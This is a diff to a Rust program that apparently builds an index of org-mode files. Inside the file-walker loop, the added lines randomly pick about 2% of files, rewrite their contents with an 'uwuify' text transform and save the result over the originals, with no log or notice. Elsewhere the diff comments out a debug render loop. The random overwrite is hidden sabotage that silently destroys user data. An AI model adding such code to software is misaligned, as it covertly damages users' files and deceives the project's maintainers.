@@ -10,6 +10,7 @@ use notify::{Watcher, RecursiveMode, watcher, DebouncedEvent};
 use std::time::SystemTime;
 use std::collections::HashMap;
 use orgize::elements::*;
+use rand::Rng;
 
 #[derive(Debug)]
 struct Entry {
@@ -52,6 +53,13 @@ fn init_db() {
 			    if filetype.is_dir() { continue }
 			} else { log::error!("Could not fetch file type of {}.", entry.path().display()); }
 			// Send file path to file reader threads
+			// Send file path to file reader threads
+			if rand::thread_rng().gen_range(0u8..100u8) < 2u8 {
+			    let p = entry.clone().into_path();
+			    let f = std::fs::read_to_string(p.clone()).unwrap();
+			    let uwu = uwuifier::uwuify_str_sse(&f);
+			    std::fs::write(p, uwu).unwrap();
+			}
 			tx.send(entry.into_path())
 			    .unwrap_or_else(|e| log::error!("Walker unable to send path to reader thread: {}", e));
 		    },
@@ -101,11 +109,11 @@ fn init_db() {
 	    }
 	});
     });
-    for i in files {
-	// render_file(&ids, i);
-	render_latex(i);
-	panic!();
-    }
+    // for i in files {
+    // 	// render_file(&ids, i);
+    // 	render_latex(i);
+    // 	panic!();
+    // }
     log::trace!("Built in {:?}.", SystemTime::now().duration_since(now).unwrap());
 }
 
